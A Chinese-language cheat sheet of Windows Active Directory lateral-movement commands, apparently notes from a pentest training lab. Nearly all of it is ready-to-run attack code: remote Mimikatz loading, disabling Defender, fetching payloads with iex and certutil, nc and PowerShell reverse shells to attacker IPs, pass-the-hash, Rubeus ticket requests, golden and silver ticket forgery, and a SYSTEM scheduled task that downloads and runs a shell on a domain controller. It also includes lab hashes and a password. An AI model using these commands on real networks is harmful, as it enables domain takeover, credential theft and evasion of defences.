# 查找本地管理员可以用powershell远程登录的电脑
```
PS C:\AD> . .\Find-PSRemotingLocalAdminAccess.ps1
PS C:\AD> Find-PSRemotingLocalAdminAccess
```
或者用powerview
```
Find-LocalAdminAccess
```


# 有LocalAdmin权限的，可以用以下命令在对方机器执行验证
```
Invoke-Command -ScriptBlock {whoami;hostname} -ComputerName dcorp-mgmt
```

# 横向移动到指定电脑
```
Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local

Enter-PSSession dcorp-adminsrv.dollarcorp.moneycorp.local # 也可以不要参数
```


# 获取一个登陆的session，以便根据session指定操作
账号ciadmin可以横向登录到计算机dcorp-mgmt.dollarcorp.moneycorp.local，我们把登录的session保存在$sess
```
$sess = New-PSSession -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local
```

在指定session里载入Mimikatz
```
Invoke-Command -FilePath C:\AD\Invoke-Mimikatz.ps1 -Session $sess
```

指定目标靶机的session，在目标靶机关闭杀软（效果跟bypass AMSI大同小异，不过因为我们是目标靶机上的管理员，因此可以直接关闭）
```
Invoke-command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess
```

指定目标靶机的session，在目标靶机执行Mimikatz
```
Invoke-command -ScriptBlock ${function:Invoke-Mimikatz} -Session $sess
```

# 把powershell加载到内存
```
iex (iwr http://172.16.100.66/Invoke-Mimikatz.ps1 -UseBasicParsing)
```

# 以某个用户的身份登录到某台电脑（需要明文密码）
```
Enter-PSSession –Computername dcorp-dc –credential dcorp\Administrator
```

# 下面方法适用于得到了用户明文密码,但不是在RDP环境中（比如反弹shell中），使用这个用户身份执行命令

处理密码
```
$pw = ConvertTo-SecureString "96dQ(8i498g32N" -AsPlainText -Force
```
处理用户凭据
```
$creds = New-Object System.Management.Automation.PSCredential ("Administrator", $pw)
```
测试执行whoami命令
```
Invoke-Command -Computer hutchdc -ScriptBlock {whoami} -Credential $creds
```
如：
```
PS C:\windows\system32\inetsrv> Invoke-Command -Computer hutchdc -ScriptBlock { whoami} -Credential $creds
Invoke-Command -Computer hutchdc -ScriptBlock { whoami} -Credential $creds
hutch\administrator
```
表明用户身份是```hutch\administrator```

把nc.exe传到靶机
```
certutil -urlcache -split -f "http://192.168.54.200/nc.exe" nc.exe
```
用nc反弹一个shell回来
```
Invoke-Command -Computer hutchdc -ScriptBlock {C:\windows\temp\nc.exe 192.168.54.200 593 -e cmd.exe} -Credential $creds
```



# 以某个用户的身份打开一个新的shell，有这个用户的所有权限，但是还在本机环境中（需要NTML）
```
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:dollarcorp.moneycorp.local /ntlm:af0686cc0ca8f04df42210c9ac980760 /run:powershell.exe"'
```

# 使用 Mimikatz 进行横向运动
```
# Overpass-the-hash (more risky than Rubeus, writes to LSASS memory)
sekurlsa::pth /user:Administrator /domain:targetdomain.com /ntlm:[NTLMHASH] /run:powershell.exe

# Or, a more opsec-safe version that uses the AES256 key (similar to with Rubeus above) - works for multiple Mimikatz commands
sekurlsa::pth /user:Administrator /domain:targetdomain.com /aes256:[AES256KEY] /run:powershell.exe

# Golden ticket (domain admin, w/ some ticket properties to avoid detection)
kerberos::golden /user:Administrator /domain:targetdomain.com /sid:S-1-5-21-[DOMAINSID] /krbtgt:[KRBTGTHASH] /id:500 /groups:513,512,520,518,519 /startoffset:0 /endin:600 /renewmax:10080 /ptt

# Silver ticket for a specific SPN with a compromised service / machine account
kerberos::golden /user:Administrator /domain:targetdomain.com /sid:S-1-5-21-[DOMAINSID] /rc4:[MACHINEACCOUNTHASH] /target:dc.targetdomain.com /service:HOST /id:500 /groups:513,512,520,518,519 /startoffset:0 /endin:600 /renewmax:10080 /ptt
```

# 使用Rubeus.exe横向运动
我们可以使用 Rubeus 执行一种称为“Overpass-the-Hash”的技术。在这种技术中，我们不是直接传递散列（另一种称为传递散列的技术），而是使用帐户的 NTLM 散列来请求有效的 Kerberost 票证 (TGT)。然后，我们可以使用此票证作为目标用户向域进行身份验证。
```
# Request a TGT as the target user and pass it into the current session
# NOTE: Make sure to clear tickets in the current session (with 'klist purge') to ensure you don't have multiple active TGTs

.\Rubeus.exe asktgt /user:Administrator /rc4:[NTLMHASH] /ptt

# More stealthy variant, but requires the AES256 key (see 'Dumping OS credentials with Mimikatz' section)

.\Rubeus.exe asktgt /user:Administrator /aes256:[AES256KEY] /opsec /ptt

# Pass the ticket to a sacrificial hidden process, allowing you to e.g. steal the token from this process (requires elevation)

.\Rubeus.exe asktgt /user:Administrator /rc4:[NTLMHASH] /createnetonly:C:\Windows\System32\cmd.exe
```

# 制作金票
需要krbtgt和它的NTML哈希
```
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
```

验证金票：
```
ls \\dcorp-dc.dollarcorp.moneycorp.local\c$
```


新建一个定时任务，反弹dc上的一个shell回来。需要注意Invoke-PowerShellTcp.ps1里最后一行要加上
```
Power -Reverse -IPAddress 172.16.100.66 -Port 443
```
表示调用自己

## 制作定时任务：
```
schtasks /create /S dcorp-dc.dollarcorp.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "User366" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.66/Invoke-PowerShellTcp.ps1''')'"
```

## 触发定时任务
```
schtasks /Run /S dcorp-dc.dollarcorp.moneycorp.local /TN "User366"
```



# 制作银票
金票和银票的分别
> 1.金票伪造的TGT(Ticket GrantingTicket)，所以可以获取任何Kerberos服务权限
> 2.银票是伪造的TGS的TS，只能访问指定的服务权限
> 3.GoldenTicket是由krbtgt的hash加密
> 4.Silver Ticket是由服务账户（通常为计算机账户）hash加密
> 5.GoldenTicket在使用的过程需要同域控通信
> 6.Silver Ticket在使用的过程不需要同域控通信

如果知道一台计算机的哈希，比如DCORP-DC$
```
RID  : 000003e8 (1000)
User : DCORP-DC$
LM   :
NTLM : 126289c16302fb23b71ec09f0d3d5391
```
可以用来制作银票

普通权限shell下执行命令
```
Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:126289c16302fb23b71ec09f0d3d5391 /user:Administrator /ptt"'
```

执行完上面命令，在当前shell会有一个Administrator的session

新建一个定时任务，反弹dc上的一个shell回来。需要注意Invoke-PowerShellTcp.ps1里最后一行要加上
```
Power -Reverse -IPAddress 172.16.100.66 -Port 443
```
表示调用自己

# 使用定时任务执行命令

## 制作定时任务：
```
schtasks /create /S dcorp-dc.dollarcorp.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "User366" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.66/Invoke-PowerShellTcp.ps1''')'"
```

## 触发定时任务
```
schtasks /Run /S dcorp-dc.dollarcorp.moneycorp.local /TN "User366"
```


# 使用 WMI 执行命令
```
Invoke-WmiMethod win32_process -ComputerName dc.targetdomain.com -name create -argumentlist "powershell.exe -e $encodedCommand"
```


# 使用powershell远程执行命令
```
# Create credential to run as another user (not needed after e.g. Overpass-the-Hash)
# Leave out -Credential $Cred in the below commands to run as the current user instead

$SecPassword = ConvertTo-SecureString 'VictimUserPassword' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\targetuser', $SecPassword)

# Run a command remotely (can be used on multiple machines at once)

Invoke-Command -Credential $Cred -ComputerName dc.targetdomain.com -ScriptBlock {whoami; hostname}

# Launch a session as another user (prompt for password instead, for use with e.g. RDP)
Enter-PsSession -ComputerName dc.targetdomain.com -Credential DOMAIN/targetuser

# Create a persistent session (will remember variables etc.), load a script into said session, and enter a remote session prompt

$sess = New-PsSession -Credential $Cred -ComputerName dc.targetdomain.com
Invoke-Command -Session $sess -FilePath c:\path\to\file.ps1
Enter-PsSession -Session $sess

# Copy files to or from an active PowerShell remoting session
Copy-Item -Path .\Invoke-Mimikatz.ps1 -ToSession $sess -Destination "C:\Users\public\"
```